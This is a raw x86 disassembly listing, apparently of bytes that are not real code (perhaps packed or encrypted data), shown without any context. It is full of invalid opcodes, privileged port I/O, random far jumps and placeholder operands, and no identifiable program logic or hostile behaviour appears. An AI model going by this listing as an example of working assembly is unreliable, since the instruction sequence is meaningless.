  40278a:	sub    DWORD PTR [edi+0x1feea049],0x5f210ae0
  402794:	xlat   BYTE PTR ds:[ebx]
  402795:	mov    eax,ds:0xad0fccdb
  40279a:	sti    
  40279b:	xor    eax,0xae7899f3
  4027a0:	push   esp
  4027a1:	dec    ebp
  4027a2:	sti    
  4027a3:	inc    edi
  4027a4:	sub    eax,0xf35f666c
  4027a9:	mov    ss,WORD PTR [esp+eax*4]
  4027ac:	pop    ebp
  4027ad:	push   eax
  4027ae:	adc    dh,dl
  4027b0:	xchg   edx,eax
  4027b1:	in     eax,0x3b
  4027b3:	fidivr DWORD PTR ss:[eax]
  4027b6:	mov    cl,0xc8
  4027b8:	ret    
  4027b9:	dec    esi
  4027ba:	stos   BYTE PTR es:[edi],al
  4027bb:	das    
  4027bc:	icebp  
  4027bd:	push   edi
  4027be:	sti    
  4027bf:	cmp    al,BYTE PTR [edx+esi*2-0x3e]
  4027c3:	or     DWORD PTR [eax+0x55],edx
  4027c6:	lahf   
  4027c7:	scas   eax,DWORD PTR es:[edi]
  4027c8:	cli    
  4027c9:	push   edi
  4027ca:	jg     0x402807
  4027cc:	(bad)  [ecx+0x43c1a2f7]
  4027d2:	mov    cx,0x5005
  4027d6:	pusha  
  4027d7:	mov    WORD PTR [edi+0x54],ds
  4027da:	xlat   BYTE PTR gs:[ebx]
  4027dc:	push   eax
  4027dd:	jnp    0x4027f5
  4027df:	pop    ecx
  4027e0:	imul   esi,DWORD PTR [esi+0x2d],0x46349f93
  4027e7:	call   0x515:0xc913eb10
  4027ee:	xor    BYTE PTR [esi-0x48],ch
  4027f1:	adc    eax,DWORD PTR [ebp-0x1a418143]
  4027f7:	add    esi,DWORD PTR [ecx+0x10c6c292]
  4027fd:	cmp    BYTE PTR ds:0x6bf4cbd8,0xda
  402804:	sub    bl,0xe5
  402807:	dec    esp
  402808:	int3   
  402809:	in     al,dx
  40280a:	mov    bl,0x43
  40280c:	lods   eax,DWORD PTR ds:[esi]
  40280d:	bound  edx,QWORD PTR [edx+edi*4]
  402810:	call   0xfaa5:0xbff2e6d1
  402817:	(bad)  
  402818:	jge    0x40279b
  40281a:	jmp    0xd9f:0x2be37e63
  402821:	loopne 0x402872
  402823:	mov    eax,0x7d8494ac
  402828:	jl     0x402804
  40282a:	in     al,dx
  40282b:	lods   eax,DWORD PTR ds:[esi]
  40282c:	sbb    ecx,ecx
  40282e:	stos   BYTE PTR es:[edi],al
  40282f:	sub    bl,bl
  402831:	data16 sub BYTE PTR [edi-0x456c55bf],ch
  402838:	sbb    esi,DWORD PTR [ebp+0xa89eb2a]
  40283e:	out    0x99,al
  402840:	cwde   
  402841:	xlat   BYTE PTR fs:[ebx]
  402843:	xchg   esp,eax
  402844:	jmp    0xd43c9
  402849:	loop   0x4028c9
  40284b:	sub    ebx,esi
  40284d:	dec    eax
  40284e:	push   0xffffffb2
  402850:	xor    eax,0x6cf06254
  402855:	or     DWORD PTR [edx],edx
  402857:	mov    ebp,0x2997d5c6
  40285c:	ret    0x1c6d
  40285f:	popa   
  402860:	scas   al,BYTE PTR es:[edi]
  402861:	enter  0x8aa3,0x8
  402865:	sub    BYTE PTR [ebp*8-0x699445f0],dh
  40286c:	pop    es
  40286d:	not    DWORD PTR [ebx]
  40286f:	xchg   edx,eax
  402870:	inc    ebx
  402871:	aaa    
  402872:	xlat   BYTE PTR ds:[ebx]
  402873:	imul   ebx,DWORD PTR [edx],0xfffffff3
  402876:	jecxz  0x402816
  402878:	sub    cl,bh
  40287a:	pop    ds
  40287b:	xchg   ecx,eax
  40287c:	inc    edi
  40287d:	dec    edi
  40287e:	out    dx,al
  40287f:	jbe    0x40280b
  402881:	mov    eax,0xa6b8c5e
  402886:	xchg   esi,eax
  402887:	mov    al,0xbd
  402889:	imul   eax,DWORD PTR [eax-0x63],0xdaaabf00
  402890:	sub    edi,DWORD PTR [eax-0x34]
  402893:	mov    DWORD PTR [ebp-0x10827ae0],ebx
  402899:	push   0x7366f775
  40289e:	popf   
  40289f:	les    eax,FWORD PTR [edi]
  4028a1:	and    esi,0xffffffa4
  4028a4:	daa    
  4028a5:	imul   ecx,DWORD PTR ds:0x8ab9e8f4,0x32284820
  4028af:	mov    esi,0xe31b89f5
  4028b4:	cmp    eax,0x1cbdaac8
  4028b9:	ins    BYTE PTR es:[edi],dx
  4028ba:	xchg   ebx,eax
  4028bb:	sub    al,0xd8
  4028bd:	jo     0x4028ed
  4028bf:	data16 lods al,BYTE PTR ds:[esi]
  4028c1:	xchg   ebx,eax
  4028c2:	push   ebx
  4028c3:	inc    edi
  4028c4:	out    0x9d,eax
  4028c6:	aad    0x31
  4028c8:	repz xlat BYTE PTR es:[ebx]
  4028cb:	pushf  
  4028cc:	aaa    
  4028cd:	pop    ebx
  4028ce:	enter  0x9296,0x9b
  4028d2:	and    edi,edi
  4028d4:	mov    dl,0xfb
  4028d6:	adc    al,BYTE PTR [edx-0x3]
  4028d9:	push   esp
  4028da:	push   eax
  4028db:	push   ds
  4028dc:	lock add BYTE PTR [esi],0x7c
  4028e0:	dec    ecx
  4028e1:	mov    BYTE PTR [esi-0xabbbe22],cl
  4028e7:	hlt    
  4028e8:	xor    DWORD PTR [esi-0x7e],ebx
  4028eb:	sub    ch,BYTE PTR [edi+ebx*1-0x6]
  4028ef:	sbb    DWORD PTR [edi-0x68],eax
  4028f2:	hlt    
  4028f3:	bound  ebp,QWORD PTR [ecx]
  4028f5:	xchg   esi,edi
  4028f7:	sbb    esp,DWORD PTR [eax]
  4028f9:	ret    
  4028fa:	mov    esi,0xea52e7c6
  402900:	(bad)  
  402901:	addr16 mov edi,0x829601bb
  402907:	inc    edx
  402908:	fidivr DWORD PTR [esi]
  40290a:	lods   al,BYTE PTR ds:[esi]
  40290b:	adc    eax,0x593930e7
  402910:	cmp    BYTE PTR [esi+0x23],0xbb
  402914:	test   BYTE PTR [eax],bl
  402916:	pop    eax
  402917:	or     bh,BYTE PTR cs:[esi+0x3a]
  40291b:	repnz mov ecx,0xc44eb854
  402921:	mov    bh,0x21
  402923:	cmp    al,BYTE PTR [edi+0x59d3e66]
  402929:	dec    ecx
  40292a:	xchg   esi,eax
  40292b:	add    ah,ah
  40292d:	aas    
  40292e:	std    
  40292f:	jl     0x40295b
  402931:	adc    BYTE PTR ds:0x2278a5b8,bl
  402937:	out    dx,al
  402938:	push   ss
  402939:	xchg   ecx,eax
  40293a:	daa    
  40293b:	addr16 call 0x543bc091
  402941:	mov    eax,0x68b798d0
  402946:	mov    eax,0x7030abc3
  40294b:	adc    ebx,DWORD PTR [ecx]
  40294d:	sti    
  40294e:	add    DWORD PTR [esi+ebp*4+0x4475ddaf],esp
  402955:	in     al,dx
  402956:	sahf   
  402957:	retf   0xda63
  40295a:	in     eax,dx
  40295b:	sub    ch,ah
  40295d:	add    edi,ecx
  40295f:	repz call 0x6f4:0x71501305
  402967:	mov    edx,0x788e3b51
  40296c:	add    cl,al
  40296e:	jae    0x402943
  402970:	mov    fs,WORD PTR [eax+0x8]
  402973:	xor    dl,BYTE PTR [edi+0x6a5cc27b]
  402979:	call   0x178:0x8fc28ef7
  402980:	dec    edi
  402981:	lods   al,BYTE PTR ds:[esi]
  402982:	gs mov ch,0x98
  402985:	test   ch,0xeb
  402988:	jo     0x4029d3
  40298a:	stc    
  40298b:	adc    DWORD PTR [edi+0x67],eax
  40298e:	call   0x7a8c1f25
  402993:	nop
  402994:	push   es
  402995:	outs   dx,BYTE PTR ds:[esi]
  402996:	loope  0x4029c7
  402998:	scas   al,BYTE PTR es:[edi]
  402999:	push   ss
  40299a:	cld    
  40299b:	mov    ds:0x8e79597c,eax
  4029a0:	dec    edx
  4029a1:	in     eax,dx
  4029a2:	test   DWORD PTR [eax-0x7d67ef6],edi
  4029a8:	mov    al,0x40
  4029aa:	mov    eax,ds:0x44c56764
  4029af:	outs   dx,BYTE PTR ds:[esi]
  4029b0:	sub    dh,ah
  4029b2:	and    al,BYTE PTR [edi+0x44]
  4029b5:	test   al,0xc7
  4029b7:	cli    
  4029b8:	pop    ebx
  4029b9:	xchg   edi,eax
  4029ba:	shl    BYTE PTR [eax+0x53a07e6a],cl
  4029c0:	push   ecx
  4029c1:	jle    0x402956
  4029c3:	cmp    ch,BYTE PTR [ebx]
  4029c5:	and    cl,BYTE PTR [edi+0xe]
  4029c8:	popa   
  4029c9:	push   0x6f
  4029cb:	pop    ecx
  4029cc:	cmp    cl,BYTE PTR [esi+edi*4]
  4029cf:	pop    edx
  4029d0:	mov    ch,0x5c
  4029d2:	int    0xec
  4029d4:	scas   eax,DWORD PTR es:[edi]
  4029d5:	jg     0x4029d8
  4029d7:	fcomp  DWORD PTR [ebx+ebp*8+0x276dceb4]
  4029de:	cmp    DWORD PTR [eax+edi*2+0x4],ecx
  4029e2:	jg     0x402a55
  4029e4:	cmp    al,0x9e
  4029e6:	fdiv   DWORD PTR [esi]
  4029e8:	jg     0x40299c
  4029ea:	dec    esi
  4029eb:	mov    ebp,0x823159a2
  4029f0:	or     al,0x68
  4029f2:	push   ds
  4029f3:	aad    0xe0
  4029f5:	inc    eax
  4029f6:	mov    eax,ds:0x26675d1e
  4029fb:	aaa    
  4029fc:	fldcw  WORD PTR [edi]
  4029fe:	pop    edi
  4029ff:	cmp    ecx,DWORD PTR [edi]
  402a01:	in     eax,0xae
  402a03:	cmp    ecx,ecx
  402a05:	adc    BYTE PTR [ecx],0x43
  402a08:	or     DWORD PTR [edi-0x2efa5fd8],edx
  402a0e:	cld    
  402a0f:	push   ecx
  402a10:	seta   dh
  402a13:	retf   
  402a14:	dec    eax
  402a15:	(bad)  
  402a17:	adc    eax,0x17155b23
  402a1c:	mov    dl,0x6f
  402a1e:	rol    BYTE PTR [ebp+ebx*1+0x25ce9297],0x8d
  402a26:	cmp    DWORD PTR [ebx],eax
  402a28:	push   esp
  402a29:	cmp    eax,DWORD PTR [esi+eiz*8]
  402a2c:	sbb    al,0x47
  402a2e:	aam    0x54
  402a30:	pop    esi
  402a31:	dec    ebx
  402a32:	sar    edi,0x1a
  402a35:	pop    eax
  402a36:	sbb    DWORD PTR [esi],edi
  402a38:	(bad)  
  402a39:	push   ss
  402a3a:	push   0x6b
  402a3c:	aas    
  402a3d:	lea    ebx,[edx+0x2e942ba9]
  402a43:	ret    0x890
  402a46:	fdivr  st(4),st
  402a48:	xchg   ebp,eax
  402a49:	xchg   BYTE PTR [ecx-0x37edc40c],bh
  402a4f:	inc    ebp
  402a50:	pop    es
  402a51:	lea    edi,[edi-0x73]
  402a54:	das    
  402a55:	loopne 0x402ab7
  402a57:	aam    0x13
  402a59:	rcl    DWORD PTR [ecx],cl
  402a5b:	inc    edi
  402a5c:	out    dx,al
  402a5d:	dec    eax
  402a5e:	sub    ebp,ecx
  402a60:	push   edi
  402a61:	mov    dl,0xce
  402a63:	(bad)  
  402a64:	sti    
  402a65:	call   0x4424:0x5cea4753
  402a6c:	inc    ebx
  402a6d:	cs daa 
  402a6f:	data16 test BYTE PTR [ebp+0x29],ch
  402a73:	mov    cl,0xe9
  402a75:	xchg   esp,eax
  402a76:	jno    0x402a50
  402a78:	add    eax,0x97329435
  402a7d:	xchg   DWORD PTR [ecx+0x22],ecx
  402a80:	cwde   
  402a81:	lods   al,BYTE PTR ds:[esi]
  402a82:	fild   QWORD PTR [ebx+0x28b97ded]
  402a88:	cmc    
  402a89:	cmp    BYTE PTR [ebx],al
  402a8b:	pop    esi
  402a8c:	outs   dx,BYTE PTR ds:[esi]
  402a8d:	pop    edx
  402a8e:	or     cl,cl
  402a90:	add    DWORD PTR [esi+0x71d02685],ebp
  402a96:	pop    edi
  402a97:	inc    esp
  402a98:	in     eax,0x68
  402a9a:	jmp    0x1cf3:0xaf637ea5
  402aa1:	jp     0x402abc
  402aa3:	sub    DWORD PTR [ebp+0x54444927],edi
  402aa9:	shl    BYTE PTR [edi+0x7b],1
  402aac:	and    esi,0xffffffde
  402aaf:	sub    DWORD PTR [edx+0x6b],ecx
  402ab2:	repnz cdq 
  402ab4:	bound  ecx,QWORD PTR [esi]
  402ab6:	jle    0x402b31
  402ab8:	pop    ecx
  402ab9:	out    dx,al
  402aba:	sbb    eax,0xbe0ac79c
  402abf:	xor    ebp,edi
  402ac1:	(bad)  
  402ac2:	dec    eax
  402ac3:	and    ecx,DWORD PTR [edi]
  402ac5:	cs nop
  402ac7:	call   0x9be3:0x99b32829
  402ace:	add    BYTE PTR [edi-0x6cb4704b],bh
  402ad4:	int3   
  402ad5:	fcom   DWORD PTR [edi+0x35f06689]
  402adb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402adc:	shl    DWORD PTR [ebx],cl
  402ade:	cmp    BYTE PTR [eax],dl
  402ae0:	leave  
  402ae1:	push   ss
  402ae2:	xchg   ebp,eax
  402ae3:	jae    0x402b4e
  402ae5:	xchg   ebp,eax
  402ae6:	idiv   BYTE PTR [ebp-0x6ad0f7c5]
  402aec:	retf   
  402aed:	jns    0x402aa2
  402aef:	dec    esp
  402af0:	cmp    ah,0x4e
  402af3:	jmp    0xff42:0x28eb9adb
  402afa:	dec    esp
  402afb:	cmp    eax,0x90fa993b
  402b00:	stos   BYTE PTR es:[edi],al
  402b01:	sbb    eax,0x24ad911a
  402b06:	jg     0x402ac5
  402b08:	data16 mov ch,0xc2
  402b0b:	mov    ds:0x90dd2506,eax
  402b10:	xor    DWORD PTR [ebp-0x30],eax
  402b13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b14:	mov    esp,0xbe1ed932
  402b19:	retf   0xfd0f
  402b1c:	out    dx,al
  402b1d:	and    BYTE PTR [ecx-0x450bce],bl
  402b23:	std    
  402b24:	call   0x97f4b99b
  402b29:	sbb    eax,0xcb115f1
  402b2e:	inc    esp
  402b2f:	nop
  402b30:	sub    ecx,DWORD PTR [ebx+0x1b13f88d]
  402b36:	popa   
  402b37:	dec    esp
  402b38:	push   ss
  402b39:	call   0x4677:0xaa0b7a93
  402b40:	fsubrp st(3),st
  402b42:	jge    0x402b86
  402b44:	repz loop 0x402b38
  402b47:	mov    dh,0xa3
  402b49:	lock bnd jbe 0x402ade
  402b4d:	jg     0x402b71
  402b4f:	aad    0x45
  402b51:	es jb  0x402b47
  402b54:	mov    ds:0x7e9d6d58,eax
  402b59:	or     dh,BYTE PTR [eax]
  402b5b:	xchg   ebx,eax
  402b5c:	retf   0xc3c8
  402b5f:	popa   
  402b60:	jmp    0x402b51
  402b62:	jmp    0x5875050c
  402b67:	outs   dx,BYTE PTR ds:[esi]
  402b68:	out    0x47,eax
  402b6a:	add    dh,BYTE PTR [edx]
  402b6c:	rcr    BYTE PTR [edi+0x7cd3e740],1
  402b72:	mov    ebx,0x4e5913e7
  402b77:	iret   
  402b78:	adc    eax,0xe32d5ceb
  402b7d:	shr    DWORD PTR [eax-0x7b],cl
  402b80:	out    0x99,al
  402b82:	dec    esp
  402b83:	jecxz  0x402b3c
  402b85:	cmp    eax,0x30d23fd4
  402b8a:	in     eax,0x1c
  402b8c:	fldenv [esi+ecx*4+0x3b34f626]
  402b93:	add    DWORD PTR [ebp+0x77],ebp
  402b96:	mov    bl,0xdb
  402b98:	add    al,BYTE PTR gs:[esi+0x751e8926]
  402b9f:	cmp    eax,0xa0ceb1bb
  402ba4:	cld    
  402ba5:	mov    ecx,0xbf466056
  402baa:	repnz scas eax,DWORD PTR es:[edi]
  402bac:	add    edx,DWORD PTR [esi]
  402bae:	mov    esp,?
  402bb0:	sbb    DWORD PTR [ebx+0x36],edi
  402bb3:	push   esi
  402bb4:	cmp    BYTE PTR [eax],al
  402bb6:	push   0xf6335d51
  402bbb:	dec    edx
  402bbc:	stc    
  402bbd:	(bad)  
  402bbe:	xchg   ebx,eax
  402bbf:	mov    BYTE PTR [eax-0x39],dh
  402bc2:	or     ch,dh
  402bc4:	push   esp
  402bc5:	xchg   esi,eax
  402bc6:	mov    ds:0xb82a793a,eax
  402bcb:	popa   
  402bcc:	(bad)  
  402bcd:	jns    0x402b8c
  402bcf:	in     al,0xdf
  402bd1:	loopne 0x402b84
  402bd3:	jmp    0x402c45
  402bd5:	cld    
  402bd6:	les    esp,FWORD PTR [ecx-0x15]
  402bd9:	stc    
  402bda:	jl     0x402bdc
  402bdc:	retf   0xd90a
  402bdf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402be0:	jno    0x402c56
  402be2:	xchg   edx,eax
  402be3:	jl     0x402c32
  402be5:	scas   eax,DWORD PTR es:[edi]
  402be6:	mov    ?,esp
  402be8:	out    dx,eax
  402be9:	pop    edi
  402bea:	xchg   DWORD PTR gs:[ebx+0xa],esi
  402bee:	fwait
  402bef:	in     eax,dx
  402bf0:	test   DWORD PTR [esi+eax*1+0x35],0x8812fbed
  402bf8:	(bad)  
  402bf9:	and    dl,BYTE PTR [ebp+0x24]
  402bfc:	pop    esi
  402bfd:	jmp    FWORD PTR [edi-0x73db450d]
  402c03:	mov    ah,BYTE PTR [esi]
  402c05:	sahf   
  402c06:	cmp    DWORD PTR [esi],eax
  402c08:	mov    eax,ds:0x131dff15
  402c0d:	cs pop esi
  402c0f:	outs   dx,DWORD PTR ds:[esi]
  402c10:	sub    DWORD PTR [edi],0x55
  402c13:	mov    al,0xaa
  402c15:	ins    DWORD PTR es:[edi],dx
  402c16:	mov    edx,0xd0b3bcdc
  402c1b:	cmp    eax,0xf7ac7d7c
  402c20:	pop    eax
  402c21:	std    
  402c22:	test   DWORD PTR [eax+0x16],ecx
  402c25:	push   eax
  402c26:	mov    eax,0xed3537c0
  402c2b:	sub    BYTE PTR [edi-0x57],bh
  402c2e:	push   edx
  402c2f:	sbb    dh,dh
  402c31:	cmp    DWORD PTR [eax-0x6d59dbbb],ebx
  402c37:	pop    eax
  402c38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c39:	push   es
  402c3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402c3b:	je     0x402ca6
  402c3d:	or     bl,BYTE PTR [eax+0x7c2cb347]
  402c43:	jl     0x402c84
  402c45:	xor    esi,DWORD PTR [ebp-0x3f38fa35]
  402c4b:	scas   eax,DWORD PTR es:[edi]
  402c4c:	adc    al,0x78
  402c4e:	dec    edx
  402c4f:	mov    ds:0xbb786dec,eax
  402c54:	xchg   esp,eax
  402c55:	lds    esi,FWORD PTR [eax-0x58ef6a4d]
  402c5b:	sub    DWORD PTR [ebx+0x577cc9d7],ebx
  402c61:	jo     0x402cdd
  402c63:	and    al,0x8e
  402c65:	fcomp  DWORD PTR [edx-0x7bee636e]
  402c6b:	scas   al,BYTE PTR es:[edi]
  402c6c:	inc    eax
  402c6d:	push   ebp
  402c6e:	cmp    dl,BYTE PTR [eax-0x1f31333e]
  402c74:	mov    ds:0x7983fd6c,al
  402c79:	outs   dx,DWORD PTR ds:[esi]
  402c7a:	mov    ebp,0x7d00d4ec
  402c7f:	pop    eax
  402c80:	leave  
  402c81:	add    DWORD PTR [eax-0x1632ded3],0xffffffca
  402c88:	add    BYTE PTR [eax-0x26],ah
  402c8b:	rdpmc  
  402c8d:	or     bl,BYTE PTR [ebx]
  402c8f:	push   ss
  402c90:	adc    al,0x2b
  402c92:	cli    
  402c93:	dec    edi
  402c94:	inc    esp
  402c95:	fdivr  QWORD PTR [eax]
  402c97:	(bad)  [edi+0x5]
  402c9a:	hlt    
  402c9b:	adc    eax,0xdb41eaf3
  402ca0:	test   al,0x38
  402ca2:	push   ds
  402ca3:	nop
  402ca4:	pop    eax
  402ca5:	inc    edx
  402ca6:	sahf   
  402ca7:	sub    edx,esi
  402ca9:	in     eax,0xfc
  402cab:	xor    al,0xc2
  402cad:	jge    0x402ce7
  402caf:	cmp    al,bl
  402cb1:	jns    0x402cb7
  402cb3:	out    0x60,eax
  402cb5:	outs   dx,DWORD PTR ds:[esi]
  402cb6:	jg     0x402c73
  402cb8:	dec    ebp
  402cb9:	inc    ebx
  402cba:	daa    
  402cbb:	adc    cl,cl
  402cbd:	daa    
  402cbe:	aad    0x31
  402cc0:	jg     0x402cb1
  402cc2:	push   edi
  402cc3:	mov    ebx,0xafc46879
  402cc8:	ds popa 
  402cca:	in     eax,0x3b
  402ccc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ccd:	sbb    al,0x49
  402ccf:	sub    DWORD PTR [ecx+0x51f4a35b],ebx
  402cd5:	push   0xffffff9b
  402cd7:	cs add al,dh
  402cda:	daa    
  402cdb:	and    edi,ebp
  402cdd:	and    BYTE PTR [ebx-0x3604a48f],bl
  402ce3:	iret   
  402ce4:	mov    dl,0x9
  402ce6:	sbb    al,0xf
  402ce8:	in     al,dx
  402ce9:	(bad)  
  402cea:	pop    esi
  402ceb:	or     ebx,DWORD PTR [edi-0x1366bbbb]
  402cf1:	inc    ebp
  402cf2:	inc    edi
  402cf3:	jmp    0xcbe20b80
  402cf8:	jl     0x402d2c
  402cfa:	and    cl,bl
  402cfc:	daa    
  402cfd:	xor    ch,bh
  402cff:	test   eax,0xeed698dd
  402d04:	(bad)  
  402d06:	in     eax,dx
  402d07:	nop
  402d08:	int    0xd9
  402d0a:	(bad)  
  402d0b:	pop    ebx
  402d0c:	cmc    
  402d0d:	out    dx,eax
  402d0e:	mov    ch,0x8d
  402d10:	xchg   ecx,eax
  402d11:	mov    ?,WORD PTR [ebp-0x58]
  402d14:	adc    edx,ebx
  402d16:	jle    0x402d88
  402d18:	adc    eax,0x98d6d9e8
  402d1d:	inc    esp
  402d1e:	mov    ah,0xa
  402d20:	mov    esi,0x4788063
  402d25:	jno    0x402d9b
  402d27:	sbb    eax,0xb167863a
  402d2c:	(bad)  
  402d2d:	and    cl,BYTE PTR [ecx+0x21]
  402d30:	outs   dx,DWORD PTR ds:[esi]
  402d31:	push   ss
  402d32:	jmp    0x402d21
  402d34:	cdq    
  402d35:	pop    es
  402d36:	or     dh,BYTE PTR [ebx-0x7f9edba8]
  402d3c:	arpl   bx,sp
  402d3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d3f:	or     cl,dh
  402d41:	xlat   BYTE PTR ds:[ebx]
  402d42:	cmp    BYTE PTR [ebx],dl
  402d44:	xchg   BYTE PTR [esi+0x78],ah
  402d47:	sbb    esp,ebp
  402d49:	dec    ecx
  402d4a:	push   0xf624113d
  402d4f:	push   cs
  402d50:	jo     0x402d4a
  402d52:	pop    es
  402d53:	sub    al,0xb1
  402d55:	jno    0x402dae
  402d57:	pop    edx
  402d58:	dec    edi
  402d59:	push   edi
  402d5a:	fstp   TBYTE PTR [edi-0x33d1910e]
  402d60:	test   BYTE PTR [edx+0x636c2189],dl
  402d66:	in     al,dx
  402d67:	mov    ah,0xf5
  402d69:	inc    esi
  402d6b:	fist   DWORD PTR [eax]
  402d6d:	in     eax,dx
  402d6e:	and    DWORD PTR [eax],ecx
  402d70:	jae    0x402d27
  402d72:	mov    ds:0xe7171134,al
  402d77:	sbb    BYTE PTR [ecx+0x7267de96],al
  402d7d:	rol    DWORD PTR [ecx+0x46852a8],cl
  402d83:	vmaxsd xmm0,xmm0,xmm2
  402d87:	fst    DWORD PTR [ebx]
  402d89:	lock dec eax
  402d8b:	sbb    BYTE PTR [ecx+0x17726afd],bh
  402d91:	gs add eax,0xadfafbfb
  402d97:	mov    ds,WORD PTR [ecx-0xf]
  402d9a:	ins    BYTE PTR es:[edi],dx
  402d9b:	les    edx,FWORD PTR [edi]
  402d9d:	push   esp
  402d9e:	stc    
  402d9f:	into   
  402da0:	push   ds
  402da1:	popf   
  402da2:	mov    DWORD PTR [ebx+0x1e],ebp
  402da5:	cmp    dl,cl
  402da7:	lea    esi,[eax-0x36637291]
  402dad:	gs pop esi
  402daf:	push   esi
  402db0:	(bad)  
  402db1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402db2:	jecxz  0x402df8
  402db4:	adc    dl,BYTE PTR fs:[eax+0x28b93794]
  402dbb:	pop    edi
  402dbc:	mov    bh,0xca
  402dbe:	push   edx
  402dbf:	sbb    eax,0xeaf1ae2
  402dc4:	(bad)  
  402dc5:	scas   eax,DWORD PTR es:[edi]
  402dc6:	ss jmp 0xc223:0x7585be8d
  402dce:	call   0x84c03329
  402dd3:	push   edi
  402dd4:	mov    bl,0x53
  402dd6:	xchg   edi,eax
  402dd7:	push   edi
  402dd8:	fcomp  QWORD PTR [ecx+0x5ee19d1d]
  402dde:	mov    ebx,0xe0acdd43
  402de3:	cmp    DWORD PTR [edi+ecx*1-0x5f],0x5fea19e8
  402deb:	cli    
  402dec:	cmp    eax,0x5ce69bb1
  402df1:	xchg   esi,eax
  402df2:	stos   BYTE PTR es:[edi],al
  402df3:	cli    
  402df4:	nop
  402df5:	inc    edi
  402df6:	cld    
  402df7:	mov    BYTE PTR [ebp+0x13],cl
  402dfa:	xor    dh,BYTE PTR [ebx+0x29977361]
  402e00:	mov    bh,0x11
  402e02:	fst    DWORD PTR [edi+0x2e]
  402e05:	jns    0x402de4
  402e07:	cmp    al,0xb2
  402e09:	push   ebx
  402e0a:	or     al,0x5
  402e0c:	mov    ds:0x84c6b0b5,eax
  402e11:	(bad)  
  402e12:	lods   al,BYTE PTR ds:[esi]
  402e13:	mov    ?,WORD PTR [ebx-0x58]
  402e16:	(bad)  
  402e17:	xor    eax,0xf42e42d0
  402e1c:	and    DWORD PTR [ecx+0x419843],0xe4ebbfb6
  402e26:	repnz dec esp
  402e28:	test   DWORD PTR [ecx-0x4d],ebp
  402e2b:	sub    dl,BYTE PTR [esi+0x33]
  402e2e:	cmp    edx,DWORD PTR [eax+ebx*4]
  402e31:	jecxz  0x402e51
  402e33:	out    dx,al
  402e34:	arpl   WORD PTR [edx],sp
  402e36:	jmp    0xeea4:0x62c5e2eb
  402e3d:	(bad)  
  402e3e:	out    dx,al
  402e3f:	xor    al,0x15
  402e41:	pop    edi
  402e42:	and    eax,0x66bbd55f
  402e47:	pop    esi
  402e48:	repz icebp 
  402e4a:	inc    esi
  402e4b:	dec    edi
  402e4c:	clc    
  402e4d:	hlt    
  402e4e:	sbb    al,0x15
  402e50:	jg     0x402e8e
  402e52:	mov    esi,0xe9d956b4
  402e57:	or     eax,0x235c36b6
  402e5c:	jmp    0xd3ec459d
  402e61:	ds (bad) 
  402e63:	loope  0x402e1e
  402e65:	jae    0x402ec1
  402e67:	jnp    0x402e5d
  402e69:	call   0x990b:0x6e6e1798
  402e70:	sbb    al,0xab
  402e72:	stos   DWORD PTR es:[edi],eax
  402e73:	mov    al,ds:0xaa45cf79
  402e78:	pop    ebx
  402e79:	jle    0x402ee0
  402e7b:	xor    esp,DWORD PTR [edx]
  402e7d:	imul   esp,DWORD PTR [ebx],0x6a6eccc6
  402e83:	push   esp
  402e84:	in     eax,0x2c
  402e86:	mov    ds:0xaf8ee63d,al
  402e8b:	loope  0x402e4a
  402e8d:	pop    ds
  402e8e:	cdq    
  402e8f:	adc    edx,ebp
  402e91:	sbb    eax,0x77cba17d
  402e96:	fdiv   DWORD PTR [edi-0x1d]
  402e99:	pop    ebp
  402e9a:	loop   0x402ee7
  402e9c:	xchg   edi,eax
  402e9d:	xchg   edx,eax
  402e9e:	sbb    eax,0xae5122ef
  402ea3:	sahf   
  402ea4:	loop   0x402eaa
  402ea6:	cmp    DWORD PTR [ebx+0x62],ebp
  402ea9:	lods   al,BYTE PTR ds:[esi]
  402eaa:	je     0x402e58
  402eac:	cmp    eax,0xd5886d50
  402eb1:	sbb    al,0xe0
  402eb3:	and    al,0x2
  402eb5:	out    dx,al
  402eb6:	xchg   DWORD PTR [edx-0x1b12901],edx
  402ebc:	push   eax
  402ebd:	jb     0x402e87
  402ebf:	mov    esp,0x6abc0074
  402ec4:	outs   dx,BYTE PTR ds:[esi]
  402ec5:	mov    cl,BYTE PTR [edx]
  402ec7:	mov    ecx,0xc1e5b0ca
  402ecc:	and    dh,ch
  402ece:	mov    ds:0x6d7ffce4,al
  402ed3:	scas   al,BYTE PTR es:[edi]
  402ed4:	div    cl
  402ed6:	repz and edx,ecx
  402ed9:	xchg   esi,eax
  402eda:	out    0x5a,eax
  402edc:	adc    cl,BYTE PTR [eax]
  402ede:	jno    0x402ed4
  402ee0:	scas   al,BYTE PTR es:[edi]
  402ee1:	mov    dh,0xf2
  402ee3:	das    
  402ee4:	sub    al,0x16
  402ee6:	or     ch,BYTE PTR [esp+edi*4]
  402ee9:	out    0xf6,al
  402eeb:	fadd   DWORD PTR cs:[edx+edx*2-0x5a]
  402ef0:	pop    ds
  402ef1:	loopne 0x402edd
  402ef3:	mov    al,0x73
  402ef5:	sub    BYTE PTR [edi+0x55243c89],ch
  402efb:	sbb    DWORD PTR [ecx+0x15a5cfbf],0xac986ab3
  402f05:	ret    
  402f06:	xlat   BYTE PTR ds:[ebx]
  402f07:	shr    DWORD PTR [ecx-0x70807ad6],0xd2
  402f0e:	ins    DWORD PTR es:[edi],dx
  402f0f:	sub    BYTE PTR [eax-0x5b],bh
  402f12:	push   ecx
  402f13:	dec    edx
  402f14:	or     al,0xfc
  402f16:	test   BYTE PTR [ecx+0x1bd685a3],bh
  402f1c:	xlat   BYTE PTR ds:[ebx]
  402f1d:	jge    0x402f7f
  402f1f:	or     bh,dl
  402f21:	mov    eax,0xdf5cf0ed
  402f26:	aad    0xa6
  402f28:	sbb    al,0xc6
  402f2a:	fisttp QWORD PTR ds:0xe9eeeabd
  402f30:	mov    ds:0x69356fcf,eax
  402f35:	and    DWORD PTR [ecx],ecx
  402f37:	add    al,0x9a
  402f39:	pop    ebx
  402f3a:	mov    bl,0x4a
  402f3c:	mov    ds,WORD PTR [ecx-0x6e]
  402f3f:	sbb    edi,edx
  402f41:	rep outs dx,DWORD PTR ds:[esi]
  402f43:	xchg   edx,eax
